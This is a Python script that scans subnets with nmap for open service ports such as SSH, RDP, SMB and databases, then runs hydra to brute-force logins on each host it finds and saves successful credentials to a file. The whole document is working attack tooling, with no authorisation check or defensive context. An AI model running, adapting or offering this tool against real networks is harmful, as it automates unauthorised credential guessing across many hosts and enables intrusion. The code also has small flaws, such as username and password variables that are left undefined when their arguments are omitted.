import subprocess
import sys
import argparse
import os

def parse_hydra_output(output):
    """
    Parses hydra output to extract successful login credentials.
    Returns a tuple (success, username, password, host) if successful, otherwise (None, None, None, None).
    """
    lines = output.splitlines()
    for line in lines:
        if "login:" in line.lower() and "password:" in line.lower():
            parts = line.split()
            if len(parts) >= 7:
                return True, parts[4], parts[6], parts[1]
    return False, None, None, None

def scan_subnets(subnet_list, service):
    open_hosts = []
    port_mapping = {
        'ssh': '22',
        'ftp': '21',
        'rdp': '3389',
        'smb': '445',
        'http': '80',
        'https': '443',
        'mysql': '3306',
        'postgresql': '5432',
        'telnet': '23',
        'vnc': '5900',
        'mssql': '1433',
        'redis': '6379'
    }

    if service not in port_mapping:
        print("Invalid service. Choose from: ssh, ftp, rdp, smb, http, https, mysql, postgresql, telnet, vnc, mssql, redis.")
        sys.exit(1)

    port = port_mapping[service]

    # Temporary file for storing IPs
    ip_file = '/tmp/open_hosts.txt'

    try:
        # Open a temporary file to store IPs
        with open(ip_file, 'w') as f:
            for subnet in subnet_list:
                print(f"Scanning {subnet} for open {service} ports...")
                result = subprocess.run(['nmap', '-p', port, '--open', '-oG', '-', subnet],
                                        capture_output=True, text=True)

                for line in result.stdout.splitlines():
                    if f'{port}/open' in line:
                        parts = line.split()
                        ip = parts[1]
                        f.write(ip + '\n')
                        open_hosts.append(ip)  # Store IP in list as well

        # No need to read IPs from the temporary file anymore

    except Exception as e:
        print(f"Error scanning subnets: {e}")
        sys.exit(1)
    finally:
        # Clean up: remove the temporary file
        if os.path.exists(ip_file):
            os.remove(ip_file)

    return open_hosts

def run_hydra(open_hosts, usernames, passwords, service):
    found_credentials_file = 'found_credentials.txt'
    
    try:
        with open(found_credentials_file, 'w') as output_file:
            for host in open_hosts:
                print(f"Bruteforcing {host} with {service}...")
    
                # Prepare command for hydra
                command = ['hydra', '-t', '4']
    
                if usernames.endswith('.txt'):
                    command += ['-L', usernames]
                else:
                    command += ['-l', usernames]
    
                if passwords.endswith('.txt'):
                    command += ['-P', passwords]
                else:
                    command += ['-p', passwords]
    
                if service == 'ftp':
                    command += ['-e', 'n']  # Try anonymous FTP
                
                command += [f'{service}://{host}']
    
                try:
                    result = subprocess.run(command, capture_output=True, text=True)
                    if result.returncode == 0:
                        success, username, password, _ = parse_hydra_output(result.stdout)
                        if success:
                            output_file.write(f"Successful brute-force on {service}://{host} with {username}:{password}\n")
                        else:
                            output_file.write(f"No valid credentials found for {service}://{host}\n")
                    else:
                        output_file.write(f"Failed to brute-force {service}://{host} with {usernames}:{passwords}\n")
                except subprocess.CalledProcessError as e:
                    output_file.write(f"Error running hydra on {service}://{host}: {e}\n")
    
    except Exception as e:
        print(f"Error writing found credentials to file: {e}")

def main():
    parser = argparse.ArgumentParser(description="Scan subnets and brute force services.")
    parser.add_argument('-s', '--subnet', help="File or single subnet (e.g. 192.168.1.0/24)")
    parser.add_argument('-u', '--username', help="File or single username")
    parser.add_argument('-p', '--password', help="File or single password")
    parser.add_argument('-S', '--service', required=True, help="Service to brute force (ssh, ftp, rdp, smb, http, https, mysql, postgresql, telnet, vnc, mssql, redis)")

    args = parser.parse_args()

    # Handle subnets
    subnet_list = []
    if args.subnet:
        if args.subnet.endswith('.txt'):
            with open(args.subnet) as f:
                subnet_list = [line.strip() for line in f if line.strip()]
        else:
            subnet_list.append(args.subnet)

    # Handle usernames
    if args.username:
        usernames = args.username

    # Handle passwords
    if args.password:
        passwords = args.password

    open_hosts = scan_subnets(subnet_list, args.service)

    if open_hosts:
        run_hydra(open_hosts, usernames, passwords, args.service)
    else:
        print(f"No hosts found with open port for {args.service}.")

if __name__ == '__main__':
    main()
